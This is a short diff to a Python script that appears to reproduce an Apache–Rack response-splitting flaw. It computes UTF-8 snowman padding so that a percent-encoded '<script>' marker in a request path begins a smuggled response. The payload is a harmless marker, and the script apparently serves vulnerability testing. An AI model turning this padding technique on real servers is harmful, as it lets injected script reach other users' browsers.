@@ -18,6 +18,7 @@ import subprocess
 import tempfile
 import time
 from pathlib import Path
+from urllib.parse import quote_from_bytes
 
 
 def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
@@ -94,12 +95,18 @@ def main() -> int:
                 # Keep the delayed tail in ordinary body syntax. A harmless
                 # UTF-8 body byte precedes the script so Apache does not see
                 # '<script>' as the first byte of a possible next response.
-                # With 40 snowmen before the marker and 12 after it, the
-                # Rack character-count boundary starts at snowman+script.
+                # The padding is calculated below so the Rack character-count
+                # boundary starts at snowman+script.
+                script = b"<script>A_CONTROLLED_MARKER</script>"
+                before = 40
+                # Rack's character-count boundary starts exactly at the
+                # extra snowman before the script. The equation accounts for
+                # that snowman and the final response newline.
+                after = 2 * before - len(script) - 2
                 path = (
-                    "/missing/" + "%E2%98%83" * 40
-                    + "%E2%98%83%3Cscript%3EA_CONTROLLED_MARKER%3C%2Fscript%3E"
-                    + "%E2%98%83" * 12
+                    "/missing/" + "%E2%98%83" * before
+                    + "%E2%98%83" + quote_from_bytes(script, safe=b"")
+                    + "%E2%98%83" * after
                 )
             else:
                 path = "/missing/" + "%E2%98%83" * 80 + "A_CONTROLLED_MARKER"
